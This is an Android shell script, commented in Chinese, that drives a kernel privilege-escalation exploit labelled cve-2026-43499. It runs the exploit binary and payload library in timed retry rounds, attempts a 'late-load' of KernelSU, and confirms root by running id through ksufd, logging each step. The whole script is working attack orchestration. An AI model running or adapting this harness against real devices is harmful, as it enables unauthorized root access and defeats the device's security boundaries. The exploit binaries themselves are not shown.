#!/system/bin/sh
# 快速失败版 root capture（v2）：
#   payload 内部 8 次×300s=40min 的最坏情况 → 3 次×240s=12min
#   外层 2 轮；两轮全败 => 由 PC 端循环 reboot 换内存布局重抽
# 用法：EXPLOIT_ATTEMPTS/EXPLOIT_ATTEMPT_TIMEOUT_SEC 已内置
BASE=/data/local/tmp/f731
cd $BASE || exit 2
LOG=$BASE/cap.log
: > $LOG
echo "[$(date +%H:%M:%S)] === fast_capture start pid=$$ env=A3/T240 ===" >> $LOG
export EXPLOIT_ATTEMPTS=3
export EXPLOIT_ATTEMPT_TIMEOUT_SEC=240
for n in 1 2; do
  echo "[$(date +%H:%M:%S)] payload attempt $n begin" >> $LOG
  ./cve-2026-43499-root --run-payload ./cve-2026-43499-app.so ./cve-2026-43499-root ./cap_run_$n.log > $BASE/cap_try_$n.out 2>&1
  rc=$?
  echo "[$(date +%H:%M:%S)] payload attempt $n done rc=$rc" >> $LOG
  ./cve-2026-43499-root --late-load > $BASE/cap_ll_$n.out 2>&1
  lrc=$?
  echo "[$(date +%H:%M:%S)] late-load rc=$lrc $(tail -1 $BASE/cap_ll_$n.out 2>/dev/null | head -c 120)" >> $LOG
  if [ "$lrc" = "0" ]; then
    echo "[$(date +%H:%M:%S)] *** LATE-LOAD PASS — KSU LOADED ***" >> $LOG
    /data/local/tmp/f731/ksufd -- id >> $LOG 2>&1
    break
  fi
  sleep 5
done
echo "[$(date +%H:%M:%S)] === fast_capture end ===" >> $LOG
tail -20 $LOG
